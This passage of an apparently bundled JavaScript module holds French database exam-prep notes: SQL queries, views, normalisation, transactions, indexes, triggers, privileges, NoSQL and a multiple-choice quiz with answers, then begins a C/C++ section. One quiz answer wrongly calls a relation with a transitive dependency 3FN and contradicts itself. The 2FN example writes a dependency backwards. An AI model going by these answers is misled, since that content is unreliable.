 7   WHERE cne IN (

                                                                                          5.6. VUES

 8         SELECT cne FROM Inscription WHERE note >= 14
 9   );
11   -- 3. EXISTS : teste l ' existence
12   SELECT nom FROM Etudiant e
13   WHERE EXISTS (
14       SELECT 1 FROM Inscription i
15       WHERE i . cne = e . cne AND i . note >= 10
16   );
18   -- NOT EXISTS : anti - jointure
19   SELECT nom FROM Etudiant e
20   WHERE NOT EXISTS (
21       SELECT 1 FROM Inscription i WHERE i . cne = e . cne
22   );
23   -- Etudiants sans aucune inscription
25   -- 4. Sous - requete correllee
26   SELECT e . nom , (
27       SELECT AVG ( note ) FROM Inscription i WHERE i . cne = e . cne
28   ) AS moyenne
29   FROM Etudiant e ;
31   -- 5. Sous - requete dans FROM ( table derivee )
32   SELECT dept , AVG ( salaire ) AS moy
33   FROM (
34       SELECT dept , salaire FROM Employe WHERE statut = ' actif '
35   ) AS actifs
36   GROUP BY dept ;`},{id:"5.6",c:5,t:"Vues",x:`❖ Définition
     Une   vue est une table virtuelle définie par une requête SELECT. Elle ne stocke pas les données
     physiquement (sauf les vues matérialisées).

     ➣ Formule / Syntaxe Vues

 1   -- Creation d ' une vue
 2   CREATE VIEW Vue_Resultats AS
 3   SELECT e . cne , e . nom , c . titre , i . note
 4   FROM Etudiant e
 5   JOIN Inscription i ON e . cne = i . cne
 6   JOIN Cours c ON i . code = c . code ;
 8   -- Utilisation comme une table
 9   SELECT * FROM Vue_Resultats WHERE note >= 10;
11   -- Modifier une vue
12   CREATE OR REPLACE VIEW Vue_Resultats AS
13   SELECT e . nom , c . titre , i . note ,
14          CASE WHEN i . note >= 10 THEN ' Admis ' ELSE ' Refuse ' END AS statut
15   FROM Etudiant e
16   JOIN Inscription i ON e . cne = i . cne
17   JOIN Cours c ON i . code = c . code ;

                               5.7. OPÉRATIONS ENSEMBLISTES ET FONCTIONS AVANCÉES

19   -- Supprimer
20   DROP VIEW Vue_Resultats ;

     ★ Astuce Concours
     Avantages des vues :
         Sécurité : masquer certaines colonnes (ex: salaires)
         Simplification : masquer des jointures complexes
         Indépendance logique : la vue reste même si la structure change
     Mise à jour des vues : une vue est modifiable si elle se base sur une seule table, pas de
     GROUP BY/DISTINCT/fonctions agrégat.`},{id:"5.7",c:5,t:"Opérations ensemblistes et fonctions avancées",x:`➣ Formule / Syntaxe UNION, INTERSECT, EXCEPT

 1   -- UNION : reunion ( sans doublons )
 2   SELECT nom FROM Etudiant
 3   UNION
 4   SELECT nom FROM Professeur ;
 6   -- UNION ALL : avec doublons ( plus rapide )
 7   SELECT nom FROM Etudiant UNION ALL SELECT nom FROM Professeur ;
 9   -- INTERSECT : etudiants qui sont aussi professeurs
10   SELECT nom FROM Etudiant
11   INTERSECT
12   SELECT nom FROM Professeur ;
14   -- EXCEPT ( ou MINUS en Oracle ) : difference
15   SELECT nom FROM Etudiant
16   EXCEPT
17   SELECT nom FROM Etudiant WHERE age > 25;
18   -- Etudiants de 25 ans ou moins

     ➣ Formule / Syntaxe Fonctions de fenêtrage (Window Functions)

 1   -- OVER () : calcul sur une fenetre de lignes
 2   SELECT nom , salaire ,
 3       AVG ( salaire ) OVER () AS moy_globale ,
 4       AVG ( salaire ) OVER ( PARTITION BY dept ) AS moy_dept ,
 5       RANK () OVER ( PARTITION BY dept ORDER BY salaire DESC ) AS rang ,
 6       ROW_NUMBER () OVER ( ORDER BY salaire DESC ) AS num_ligne ,
 7       LAG ( salaire ) OVER ( ORDER BY id ) AS sal_precedent ,
 8       LEAD ( salaire ) OVER ( ORDER BY id ) AS sal_suivant
 9   FROM Employe ;

                           5.7. OPÉRATIONS ENSEMBLISTES ET FONCTIONS AVANCÉES

     ➣ Formule / Syntaxe CASE WHEN — Expression conditionnelle

 1   SELECT nom , note ,
 2       CASE
 3            WHEN note >= 16    THEN   ' Tres Bien '
 4            WHEN note >= 14    THEN   ' Bien '
 5            WHEN note >= 12    THEN   ' Assez Bien '
 6            WHEN note >= 10    THEN   ' Passable '
 7            ELSE ' Ajourne '
 8       END AS mention
 9   FROM Inscription ;
11   -- Forme simple ( egalite )
12   SELECT nom ,
13       CASE statut
14           WHEN 'A ' THEN ' Actif '
15           WHEN 'I ' THEN ' Inactif '
16           ELSE ' Inconnu '
17       END AS etat
18   FROM Employe ;

              Part III

Normalisation et Conception Avancée

  6|           Dépendances Fonctionnelles et Normalisa-
tion`},{id:"6.1",c:6,t:"Dépendances Fonctionnelles (DF)",x:`❖ Définition
  Une   dépendance fonctionnelle X → Y signifie : «la valeur de X détermine uniquement la
  valeur de Y».
  Autrement dit : si deux tuples ont la même valeur de X, ils ont la même valeur de Y.

  ❖ Définition
  Propriétés (axiomes d'Armstrong) :
   Réflexivité : Y ⊆ X ⇒ X → Y
   Augmentation : X → Y ⇒ XZ → Y Z
   Transitivité : X → Y, Y → Z ⇒ X → Z
   Union : X → Y, X → Z ⇒ X → Y Z
   Décomposition : X → Y Z ⇒ X → Y et X → Z

  ❖ Définition
  Fermeture X + : ensemble de tous les attributs déterminés par X.
  Si X
       + = tous les attributs ⇒ X est une superclé.

  Si en plus X est minimale ⇒ X est une clé candidate.`},{id:"6.2",c:6,t:"Les Formes Normales",x:`❖ Définition 1ère Forme Normale (1FN)
  Une relation est en   1FN si :
       Tous les attributs sont atomiques (pas de listes, pas de groupes répétés)
       Il n'y a pas de doublons (clé primaire définie)

  ➤ Exemple Violation de 1FN
  Non-1FN : COMMANDE(id, client, articles) où articles = «stylo, cahier, gomme»
  1FN : DETAIL_COMMANDE(id_cmd, article, quantite)

  ❖ Définition 2ème Forme Normale (2FN)
  Une relation est en   2FN si elle est en 1FN et que tout attribut non-clé dépend de la clé entière
  (pas d'une partie de la clé).

                                                                   6.2. LES FORMES NORMALES

➤ Exemple Violation de 2FN
Non-2FN : INSCRIPTION(cne, code, note, nom_etudiant )
Problème : nom_etudiant → cne seulement (dépendance partielle !)
2FN : Séparer en ETUDIANT(cne, nom) et INSCRIPTION(cne, code, note)

❖ Définition 3ème Forme Normale (3FN)

Une relation est en   3FN si elle est en 2FN et qu'il n'y a pas de dépendance transitive (aucun
attribut non-clé ne dépend d'un autre attribut non-clé).

➤ Exemple Violation de 3FN
Non-3FN : EMPLOYE(id, nom, id_dept, nom_dept )
Dépendance transitive : id → id_dept → nom_dept
3FN : EMPLOYE(id, nom, id_dept) + DEPARTEMENT(id_dept, nom_dept)

❖ Définition Forme Normale de Boyce-Codd (BCNF / 3.5FN)
Une relation est en   BCNF si : pour toute DF X → Y , X est une superclé.
BCNF est plus stricte que 3FN, mais peut perdre la préservation des DF lors de la décomposition.

➔ Résumé rapide Tableau synthétique des formes normales

 Forme Condition                           Anomalie éliminée
 1FN       Attributs atomiques             Groupes répétés
 2FN       Pas de DF partielle             Redondance partielle
 3FN       Pas de DF transitive            Redondance transitive
 BCNF      Tout déterminant = superclé     Anomalies résiduelles
 4FN       Pas de Dép. multivaluées        Dép. multivaluées
 5FN       Pas de Dép. de jointure         Décomposition sans perte

★ Astuce Concours
Algorithme de normalisation :
  1. Trouver toutes les dépendances fonctionnelles
  2. Calculer la fermeture de chaque sous-ensemble → trouver les clés candidates
  3. Vérifier 2FN, 3FN, BCNF dans l'ordre
  4. Décomposer en éliminant les DF problématiques
Objéctif pratique : aller jusqu'à 3FN en production. BCNF peut causer des problèmes de
préservation des contraintes.

              Part IV

Transactions, Index et Optimisation

     7|            Transactions et Concurrence`},{id:"7.1",c:7,t:"Propriétés ACID",x:`❖ Définition
     Une   transaction est une séquence d'opérations SQL exécutée comme une unité atomique.
                                     ACID :
     Elle doit respecter les propriétés

     ➔ Résumé rapide Propriétés ACID

      Propriété Définition                                            Mécanisme
      Atomicité     Tout ou rien (pas de demi-transaction)           ROLLBACK
      Cohérence     BD dans un état valide avant et après            Contraintes
      Isolement     Transactions concurrentes ne s'interfèrent pas   Verrouillage
      Durabilité    Les modifications sont persistées                 Journaux (WAL)

     ➣ Formule / Syntaxe Commandes de transaction

 1   BEGIN ;    -- ou START TRANSACTION ;
 3   INSERT INTO Compte ( id , solde ) VALUES (1 , 1000) ;
 4   UPDATE Compte SET solde = solde - 200 WHERE id = 1;
 5   UPDATE Compte SET solde = solde + 200 WHERE id = 2;
 7   -- Si tout est OK
 8   COMMIT ;
10   -- Si erreur
11   ROLLBACK ;
13   -- Point de sauvegarde
14   SAVEPOINT sp1 ;
15   UPDATE ...;
16   ROLLBACK TO SAVEPOINT sp1 ;           -- annule jusqu 'a sp1
17   COMMIT ;`},{id:"7.2",c:7,t:"Problèmes de concurrence",x:`➔ Résumé rapide Problèmes de concurrence

      Problème                  Description
      Dirty Read                Lit des données non validées d'une autre transaction
      Non-Repeatable Read       La même lecture donne des résultats différents
      Phantom Read              De nouvelles lignes apparaissent entre deux lectures
      Lost Update               Mise à jour écrasée par une autre transaction concurrente

                                               7.2. PROBLÈMES DE CONCURRENCE

    ➔ Résumé rapide Niveaux d'isolement SQL

    Niveau                Dirty NRR Phantom Perf.
    READ UNCOMMITTED      Oui    Oui    Oui          Max
    READ COMMITTED        Non    Oui    Oui          Bon
    REPEATABLE READ       Non    Non    Oui          Moyen
    SERIALIZABLE          Non    Non    Non          Lent

    ➣ Formule / Syntaxe Définir le niveau d'isolement

1   SET TRANSACTION ISOLATION LEVEL SERIALIZABLE ;
2   BEGIN ;
3   ...
4   COMMIT ;

     8|           Index, Optimisation et Procédures`},{id:"8.1",c:8,t:"Index",x:`❖ Définition
     Un   index est une structure de données (B-tree, Hash...) qui accélère les recherches au prix d'un
     espace supplémentaire et d'un coût à l'insertion/modification.

     ➣ Formule / Syntaxe Création d'index

 1   -- Index simple (B - tree par defaut )
 2   CREATE INDEX idx_nom ON Etudiant ( nom ) ;
 4   -- Index composite ( ordre important !)
 5   CREATE INDEX idx_dept_sal ON Employe ( dept , salaire ) ;
 7   -- Index unique
 8   CREATE UNIQUE INDEX idx_email ON Etudiant ( email ) ;
10   -- Index partiel ( PostgreSQL )
11   CREATE INDEX idx_actifs ON Employe ( nom )
12   WHERE statut = ' actif ';
14   -- Supprimer un index
15   DROP INDEX idx_nom ;
17   -- Voir les index
18   SHOW INDEX FROM Etudiant ;           -- MySQL

     ★ Astuce Concours
     Quand créer un index ?
           Colonnes fréquemment utilisées dans WHERE, JOIN, ORDER BY
           Tables volumineuses (> 10 000 lignes)
           Colonnes à forte sélectivité (beaucoup de valeurs distinctes)
     Quand éviter les index ?
           Tables petites (scan complet souvent plus rapide)
           Colonnes peu sélectives (sexe, booléen)
           Tables avec beaucoup d'INSERT/UPDATE (maintenance coûteuse)`},{id:"8.2",c:8,t:"Plan d'exécution et optimisation",x:`8.2. PLAN D'EXÉCUTION ET OPTIMISATION

     ➣ Formule / Syntaxe EXPLAIN — Analyse d'une requête

 1   -- Voir le plan d ' execution
 2   EXPLAIN SELECT * FROM Etudiant WHERE nom = ' Alaoui ';
 3   -- Montre : type de scan ( seq / index ) , cout , nb lignes estimees
 5   EXPLAIN ANALYZE SELECT ...;        -- execute ET analyse ( PostgreSQL )
 7   --   Astuces d ' optimisation :
 8   --   1. Utiliser les index existants
 9   --   2. Eviter SELECT * ( specifier les colonnes )
10   --   3. Eviter les fonctions sur les colonnes indexees dans WHERE
11   --      MAL : WHERE UPPER ( nom ) = ' ALAOUI ' ( pas d ' index utilise )
12   --      BIEN : WHERE nom = ' Alaoui '
14   -- 4. Utiliser EXISTS plutot que IN ( sous - requetes correlees )
15   -- 5. Limiter les resultats avec LIMIT
16   -- 6. Denormaliser si necessaire pour la performance`},{id:"8.3",c:8,t:"Procédures stockées et Triggers",x:`➣ Formule / Syntaxe Procédure stockée — MySQL

 1   DELIMITER //
 2   CREATE PROCEDURE AjouterEtudiant (
 3       IN p_cne VARCHAR (10) ,
 4       IN p_nom VARCHAR (50) ,
 5       IN p_age INTEGER ,
 6       OUT p_message VARCHAR (100)
 7   )
 8   BEGIN
 9       IF p_age < 18 THEN
10            SET p_message = ' Age insuffisant ';
11       ELSE
12            INSERT INTO Etudiant ( cne , nom , age )
13            VALUES ( p_cne , p_nom , p_age ) ;
14            SET p_message = ' OK ';
15       END IF ;
16   END //
17   DELIMITER ;
19   -- Appel
20   CALL AjouterEtudiant ( ' E999 ' , ' Test ' , 22 , @msg ) ;
21   SELECT @msg ;

     ➣ Formule / Syntaxe Trigger — Déclencheur

 1   -- Trigger AFTER INSERT : log des insertions
 2   CREATE TRIGGER trg_after_inscription
 3   AFTER INSERT ON Inscription
 4   FOR EACH ROW
 5   BEGIN
 6       INSERT INTO Log_Inscription ( cne , code , action , date_action )

                                                                         8.4. DROITS ET SÉCURITÉ

 7           VALUES ( NEW . cne , NEW . code , ' INSERT ' , NOW () ) ;
 8   END ;
10   -- Trigger BEFORE UPDATE : validation
11   CREATE TRIGGER trg_before_update_note
12   BEFORE UPDATE ON Inscription
13   FOR EACH ROW
14   BEGIN
15         IF NEW . note < 0 OR NEW . note > 20 THEN
16             SIGNAL SQLSTATE ' 45000 '
17             SET MESSAGE_TEXT = ' Note invalide (0 -20) ';
18         END IF ;
19   END ;
21   -- Supprimer un trigger
22   DROP TRIGGER trg_after_inscription ;`},{id:"8.4",c:8,t:"Droits et sécurité",x:`➣ Formule / Syntaxe GRANT et REVOKE

 1   -- Creer un utilisateur
 2   CREATE USER ' ahmed '@ ' localhost ' IDENTIFIED BY ' motdepasse ';
 4   -- Accorder des droits
 5   GRANT SELECT , INSERT ON ma_base . Etudiant TO ' ahmed '@ ' localhost ';
 6   GRANT ALL PRIVILEGES ON ma_base .* TO ' admin '@ '% ';
 7   GRANT SELECT ON ma_base . Vue_Resultats TO ' lecteur '@ ' localhost ';
 9   -- Revoquer des droits
10   REVOKE INSERT ON ma_base . Etudiant FROM ' ahmed '@ ' localhost ';
12   -- Voir les droits
13   SHOW GRANTS FOR ' ahmed '@ ' localhost ';
15   -- Appliquer les changements
16   FLUSH PRIVILEGES ;

          Part V

NoSQL et Concepts Modernes

         9|           Bases de Données NoSQL`},{id:"9.1",c:9,t:"Introduction au NoSQL",x:`❖ Définition
     NoSQL (Not Only SQL) : bases de données non relationnelles conçues pour :
      La scalabilité horizontale (sharding)
      Les grandes volumes de données (Big Data)
      Les schémas flexibles (sans schéma fixe)
      La haute disponibilité

     ❖ Définition
     Théorème CAP : un système distribué ne peut garantir simultanement que 2 de ces 3 propriétés
     :
            Consistency : toutes les lectures voient la dernière écriture
            Availability : toute requête reçoit une réponse (même si stale)
            Partition tolerance : le système fonctionne même en cas de partition réseau
     Internet utilise   AP ou CP. NoSQL sacrifie souvent la consistance stricte (BASE vs ACID).`},{id:"9.2",c:9,t:"Types de bases NoSQL",x:`➔ Résumé rapide Comparaison des modèles NoSQL

         Type         SGBD        Structure       Usage               CAP
         Document     MongoDB     JSON/BSON       CMS, e-commerce     AP
         Clé-Valeur   Redis       Paires k/v      Cache, sessions     AP
         Colonne      Cassandra   Colonnes        IoT, analytics      AP
         Graphe       Neo4j       N÷uds/arêtes    Réseaux sociaux     CP

     ➤ Exemple MongoDB — Document JSON

 1   // Document MongoDB
 2   {
 3     " _id " : ObjectId ( " 507 f1f77bcf86cd799439011 " ) ,
 4     " cne " : " E001 " ,
 5     " nom " : " Alaoui " ,
 6     " age " : 22 ,
 7     " inscriptions " : [
 8        { " code " : " INFO01 " , " note " : 15} ,
 9        { " code " : " MATH01 " , " note " : 13}
10     ]
11   }
13   // Requetes MongoDB equivalentes a SQL
14   db . etudiants . find ({ age : { $gt : 20 } })            -- WHERE age > 20

                                                                     9.2. TYPES DE BASES NOSQL

15   db . etudiants . find ({} , { nom : 1 , age : 1 }) -- SELECT nom , age
16   db . etudiants . aggregate ([
17      { $group : { _id : " $dept " , moy : { $avg : " $age " } } }
18   ]) -- GROUP BY dept , AVG ( age )

     ★ Astuce Concours
     SQL vs NoSQL — quand choisir ?
        SQL (relationnel) : données structurées, transactions complexes, requières des jointures,
          intégrité forte (banque, ERP)
         NoSQL : données non structurées, très haut volume, schéma variable, scalabilité horizontale
          (réseaux sociaux, IoT, catalogue produits)

    Part VI

Examens Blancs

 10 | Examen Blanc 1 — SQL et Modèle Relation-
nel

 ★ Astuce Concours
 Stratégie concours :
   1. Lisez le schéma des tables   attentivement avant chaque question
   2. Tracez menétalement l'exécution de la requête
   3. Faites attention à : NULL, DISTINCT, l'ordre GROUP BY / HAVING
   4. Pour la normalisation : trouvez d'abord les clés candidates
   5. Pour les jointures : déterminez si des lignes sont «perdues» ou non`},{id:"13.1",c:13,t:"Explications des requêtes SQL",x:`❍ Note Ordre logique d'exécution SQL
  L'ordre d'
  'ecriture n'est PAS l'ordre d'exécution :
        FROM / JOIN : construit les lignes à partir des tables
       1.
        WHERE : filtre les lignes (avant regroupement)
       2.
     3. GROUP BY : forme les groupes
     4. HAVING : filtre les groupes (après regroupement)
     5. SELECT : calcule les colonnes achées
     6. ORDER BY : trie le résultat final
     7. LIMIT / OFFSET : limite le nombre de lignes
  Conséquence : un alias défini dans SELECT n'est PAS utilisable dans WHERE (car WHERE est
  exécuté avant SELECT). Mais il est utilisable dans ORDER BY.

  ❍ Note JOIN – Comment lire
        INNER JOIN : ne garde que les lignes avec correspondance dans les deux tables.
        LEFT JOIN : garde toutes les lignes de la table gauche. Si pas de correspondance à
         droite ⇒ NULL.
        RIGHT JOIN : inverse du LEFT JOIN.
        FULL OUTER JOIN : garde toutes les lignes des deux tables.
        CROSS JOIN : produit cartésien (chaque ligne gauche × chaque ligne droite).

  ❍ Note Fonctions d'agrégation
        COUNT(*) : compte toutes les lignes (même les NULL).
        COUNT(col) : compte les lignes où col n'est PAS NULL.
        SUM(col), AVG(col), MIN(col), MAX(col) : ignorent les NULL.
        GROUP BY col : regroupe les lignes ayant la même valeur de col.
        HAVING : filtre après le regroupement (peut utiliser des fonctions d'agrégation).`},{id:"13.2",c:13,t:"Définitions BD à mémoriser",x:`❖ Définition Glossaire BD

    Terme                       Définition
    SGBD                        Logiciel gérant la création, interrogation et maintenance d'une BD.
    Relation (table)            Ensemble      de   tuples   (lignes)   partageant   un   même   schéma
                                (colonnes).

                                                   13.3. RÈGLES FONDAMENTALES À MÉMORISER

   Clé primaire (PK)                Attribut(s) identifiant   uniquement chaque tuple. NOT NULL +
                                    UNIQUE.
   Clé étrangère (FK)               Attribut référençant la clé primaire d'une autre table. Peut être
                                    NULL.

   Dépendance          fonction-    X → Y : deux tuples avec le même X ont le même Y .
   nelle
   1FN                                    atomiques (pas de listes, pas de groupes répétitifs).
                                    Valeurs
   2FN                              1FN + pas de dépendance partielle sur une clé composite.
   3FN                              2FN + pas de dépendance transitive (non-clé → non-clé).
   BCNF                             Tout déterminant est une clé candidate.

   Transaction                      Unité de travail atomique. Propriétés   ACID.
   Atomicité                        Tout ou rien : si une partie échoue, tout est annulé.
   Cohérence                        La BD passe d'un état cohérent à un autre.
   Isolation                        Les transactions concurrentes ne s'interfèrent pas.
   Durabilité                       Un COMMIT persiste même en cas de panne.

   Index                            Structure accélérant les recherches (B-tree, hash).
   Vue                              Table virtuelle définie par une requête SELECT.
   Trigger                          Procédure déclenchée automatiquement (BEFORE/AFTER IN-
                                    SERT/UPDATE/DELETE).`},{id:"13.3",c:13,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 20 règles d'or BD
       1. Ordre d'exécution :      FROM     → WHERE → GROUP BY → HAVING → SELECT →
            ORDER BY.
       2. COUNT(*) ̸= COUNT(col) : le second ignore les NULL.
       3. WHERE filtre les lignes. HAVING filtre les groupes.
       4. INNER JOIN = correspondances. LEFT JOIN = tout le côté gauche.
       5. Clé primaire : NOT NULL + UNIQUE. Clé étrangère : peut être NULL.
       6. 1FN : atomicité. 2FN : pas de DF partielle. 3FN : pas de DF transitive.
       7. ACID : Atomicité, Cohérence, Isolation, Durabilité.
       8. Un alias SELECT n'est PAS utilisable dans WHERE (mais dans ORDER BY oui).
       EXISTS est plus ecace que IN pour les grandes tables.
       9.
   10. UNION élimine les doublons ; UNION ALL les conserve (plus rapide).
   11. Toujours utiliser des       requêtes préparées (paramétrées) pour les entrées utilisateur.
   12. Un DELETE sans WHERE supprime         toutes les lignes !
   13. TRUNCATE est plus rapide que DELETE (mais non réversible).
   14. NULL n'est égal à rien, même pas à lui-même. Utiliser IS NULL.
   15. GROUP BY impose que toute colonne dans SELECT soit soit agrégée, soit dans GROUP BY.
   16. Deux NOT EXISTS imbriqués = «pour tout» (division relationnelle).
   17. En modèle E/A : entité = rectangle, association = losange, attribut = ellipse.
   18. Cardinalité 1:N ⇒ la FK va du côté N. Cardinalité N:M ⇒ table d'association.
   19. Un index accélère les SELECT mais ralentit les INSERT/UPDATE/DELETE.
   20.      ROLLBACK annule une transaction non validée.`},{id:"13.4",c:13,t:"Pièges fréquents au concours",x:`13.4. PIÈGES FRÉQUENTS AU CONCOURS

☞ Attention / Piège 12 pièges classiques BD
  1. WHERE col = NULL ne fonctionne PAS. Utiliser WHERE col IS NULL.
  2. SELECT * dans un examen ⇒ souvent pénalisé (préciser les colonnes).
  3. Confondre WHERE et HAVING : WHERE = avant groupement, HAVING = après.
  4. Oublier GROUP BY avec une fonction d'agrégation ⇒ erreur.
  5. LEFT JOIN + WHERE colDroite = ... ⇒ équivalent à un INNER JOIN.
  6. Confondre DELETE (DML, réversible) et DROP (DDL, supprime la table entière).
  7. Un alias de colonne n'est pas utilisable dans WHERE.
  8. AVG() ignore les NULL mais AVG(COALESCE(col, 0)) les compte comme 0.
  9. En normalisation : confondre DF partielle (2FN) et DF transitive (3FN).
 10. NoSQL ̸= pas de SQL. NoSQL = Not Only SQL. Certains NoSQL supportent un langage
       de requête.
 11.   DISTINCT s'applique à toutes les colonnes du SELECT, pas juste la première.
 12. Oublier le ON dans un JOIN ⇒ produit cartésien.`}],qf=[{q:`La table EMPLOYE contient 10 lignes dont 3 ont la colonne email à NULL. Que retourne SELECT
 COUNT(*), COUNT(email) FROM EMPLOYE ?`,o:["10, 10","10, 7","7, 7","7, 10"],a:1,e:"Réponse : B) 10, 7  COUNT(*) compte toutes les lignes (NULL inclus) → 10  COUNT(email) compte les valeurs non-NULL dans email → 10-3=7 Règle : COUNT(*) ̸= COUNT(colonne) lorsqu'il y a des NULL !"},{q:`Tables : A(id, val) avec 5 lignes et B(id, desc) avec 3 lignes.        Combien de lignes retourne
    SELECT * FROM A CROSS JOIN B ?`,o:["5","3","8","15"],a:3,e:"Réponse : D) 15 Le CROSS JOIN (produit cartésien) combine chaque ligne de A avec chaque ligne de B. Nombre de lignes = 5 × 3 = 15 C'est très coûteux : pour n et m lignes → n × m lignes résultantes."},{q:`1   SELECT e . nom , i . code
2   FROM Etudiant e
3   LEFT JOIN Inscription i ON e . cne = i . cne ;

    Qu'obtient-on pour un étudiant sans aucune inscription ?`,o:["La ligne de cet étudiant n'apparaît pas","La ligne apparaît avec i.code = NULL","La ligne apparaît avec i.code = 0","Une erreur est générée"],a:1,e:"Réponse : B) La ligne apparaît avec i.code = NULL Le LEFT JOIN conserve toutes les lignes de la table de gauche (Etudiant). Si aucune correspondance n'est trouvée dans Inscription, les colonnes de droite sont remplies avec NULL. Si on avait utilisé INNER JOIN, l'étudiant sans inscription n'apparaîtrait pas (réponse A)."},{q:`Quelle propriété ACID garantit que les modifications d'une transaction validée survivent à une
panne système ?`,o:["Atomicité","Cohérence","Isolement","Durabilité"],a:3,e:"Réponse : D) Durabilité  Atomicité : tout ou rien (pas de demi-transaction)  Cohérence : BD dans un état valide  Isolement : transactions concurrentes indépendantes  Durabilité : après COMMIT, les changements sont persistés même en cas de panne ✓ La durabilité est assurée par les journaux de transaction (Write-Ahead Log / WAL)."},{q:`1   SELECT nom FROM Etudiant e
2   WHERE NOT EXISTS (
3       SELECT 1 FROM Inscription i WHERE i . cne = e . cne
4   );

    Que retourne cette requête ?`,o:["Les étudiants ayant au moins une inscription","Les étudiants n'ayant aucune inscription","Toutes les inscriptions","Une erreur de syntaxe"],a:1,e:"Réponse : B) NOT EXISTS retourne TRUE si la sous-requête ne retourne aucune ligne. La sous-requête cherche les inscriptions de chaque étudiant. Si aucune inscription → sous-requête vide → NOT EXISTS = TRUE → étudiant sélectionné. Résultat : les étudiants sans aucune inscription."},{q:`Soit la relation R(A,   B, C, D) avec les DF : AB → C , AB → D, A → D. Cette relation est-elle
    en 2FN ?`,o:["Oui, car D dépend de AB","Non, car D dépend partiellement de la clé (A seulement)","Non, car C dépend de AB et non de A seul","Oui, car toutes les DF partent de la clé complète"],a:1,e:"Réponse : B La clé primaire est (A, B). Pour être en 2FN, tout attribut non-clé doit dépendre de la clé entière.  C dépend de AB → dépendance complète ✓  D dépend de A seul (A → D) → dépendance partielle ! → violation de 2FN Solution : décomposer en R1(A,B, C) et R2(A, D)."},{q:"Le niveau d'isolement READ   COMMITTED protège contre quel problème de concurrence ?",o:["Dirty Read uniquement","Dirty Read et Non-Repeatable Read","Tous les problèmes de concurrence","Aucun problème"],a:0,e:"Réponse : A) Dirty Read uniquement Niveau Dirty Read NRR Phantom READ UNCOMMITTED Oui Oui Oui READ COMMITTED Non Oui Oui REPEATABLE READ Non Non Oui SERIALIZABLE Non Non Non READ COMMITTED élimine uniquement les dirty reads. C'est le niveau par défaut dans Post- greSQL et Oracle."},{q:`Relation R(A,   B, C) avec DF : A → B , A → C , B → C .
    Est-elle en 3FN ? Est-elle en BCNF ?`,o:["3FN : Oui, BCNF : Oui","3FN : Oui, BCNF : Non","3FN : Non, BCNF : Non","3FN : Non, BCNF : Oui"],a:1,e:"Réponse : B) 3FN : Oui, BCNF : Non Clé primaire : A. Attributs non-clés : B, C.  A → B : dépend de la clé ✓  A → C : dépend de la clé ✓  B → C : dépendance transitive (A → B → C) 3FN ? : La DF B → C est transitive, mais B est un attribut non-clé. Or, en 3FN, les DF transitives sont tolérées si le déterminant (B) est une clé candidate. B n'est pas une clé candidate... En fait, la 3FN autorise B → C si B fait partie d'une clé candidate. Donc R est bien en 3FN. BCNF ? : BCNF exige que tout déterminant soit une superclé. B n'est pas une superclé → violation BCNF. Décomposition BCNF : R1(A, B) + R2(B, C)."},{q:`1   SELECT e . nom
2   FROM Etudiant e
3   WHERE NOT EXISTS (
4       SELECT 1 FROM Cours c
5       WHERE NOT EXISTS (
6            SELECT 1 FROM Inscription i
7            WHERE i . cne = e . cne AND i . code = c . code
8       )
9   );

    Que retourne cette requête ?`,o:["Les étudiants inscrits à au moins un cours","Les étudiants inscrits à tous les cours","Les étudiants non inscrits à aucun cours","Les cours sans inscription"],a:1,e:"Réponse : B) Les étudiants inscrits à tous les cours Cette requête implémente la division relationnelle (÷) en SQL :  La sous-requête interne : «les cours où l'étudiant n'est pas inscrit»  La sous-requête externe : «il n'existe aucun cours où l'étudiant n'est pas inscrit»  Traduction : l'étudiant est inscrit à tous les cours Logique : ¬∃c : ¬inscrit(e, c) ≡ ∀c : inscrit(e, c) 12 | Mémo de Dernière Minute ➔ Résumé rapide Fonctions SQL essentielles Chaînes : Dates :  CONCAT(a, b)  NOW() / CURRENT_DATE  LENGTH(s) / LEN(s)  YEAR(d) / MONTH / DAY  UPPER(s) / LOWER(s)  DATEDIFF(d1, d2)  SUBSTRING(s, pos, len)  DATE_ADD(d, INTERVAL n DAY)  TRIM(s) / LTRIM / RTRIM Numériques :  REPLACE("}],N2={id:Tf,name:Lf,color:Rf,sections:Df,quiz:qf},I2=Object.freeze(Object.defineProperty({__proto__:null,color:Rf,default:N2,id:Tf,name:Lf,quiz:qf,sections:Df},Symbol.toStringTag,{value:"Module"})),Nf="c",If="C / C++",Mf="#5eead4",Of=[{id:"1.1",c:1,t:"Introduction et historique",x:`❖ Définition – Le langage C
 Le langage C est un langage de programmation impératif, procédural et compilé, créé en
 1972 par Dennis Ritchie aux laboratoires Bell (AT&T). Il est considéré comme un langage de
 bas niveau car il permet la manipulation directe de la mémoire via les pointeurs.
 Caractéristiques principales :
     Langage compilé (code source → code machine)
     Typage statique et faible
     Accès direct à la mémoire (pointeurs)
     Portable entre différentes plateformes
     Pas de ramasse-miettes (garbage collector)
     Standard actuel : C11 (ISO/IEC 9899:2011), puis C17, C23

 ✿ Règle – Processus de compilation en C
 La compilation en C se fait en 4 étapes :
   1. Prétraitement (Preprocessing) : traitement des directives #include, #define, #ifdef,
      etc. → fichier .i
   2. Compilation : traduction du code C en assembleur → fichier .s
   3. Assemblage : conversion de l'assembleur en code objet → fichier .o
   4. Édition de liens (Linking) : liaison des fichiers objets et bibliothèques → exécutable
 Commandes GCC :
     gcc -E fichier.c -o fichier.i (prétraitement seul)
     gcc -S fichier.c -o fichier.s (jusqu'à l'assembleur)
     gcc -c fichier.c -o fichier.o (jusqu'au code objet)
     gcc fichier.c -o programme (compilation complète)`},{id:"1.2",c:1,t:"Structure d'un programme C",x:`➣ Syntaxe – Programme minimal en C

1   # include < stdio .h >     /* Inclusion de la biblioth è que standard d 'E / S */
3   int main () {           /* Fonction principale - point d ' entr'ee */
4       printf ( " Bonjour le monde !\\ n " ) ;
5       return 0;           /* 0 = succ ès , autre valeur = erreur */
6   }

    Règles :
        Tout programme C doit avoir une fonction main()
        main() retourne un int (0 = succès)
        Chaque instruction se termine par un point-virgule ;
        Les blocs de code sont délimités par { }
        C est sensible à la casse (Main ̸= main)

    ✿ Règle – Les directives du préprocesseur

     Directive                         Rôle
     #include <fichier>                Inclut un fichier d'en-tête système
     #include "fichier"                Inclut un fichier d'en-tête local (répertoire courant)
     #define NOM valeur                Définit une macro (constante symbolique)
     #undef NOM                        Supprime la définition d'une macro
     #ifdef / #ifndef                  Compilation conditionnelle
     #if / #elif / #else / #endif      Conditions de compilation
     #pragma                           Instructions spécifiques au compilateur

    ★ Astuce Concours
    Guard header pour éviter les inclusions multiples :
1   # ifndef MON_HEADER_H
2   # define MON_HEADER_H
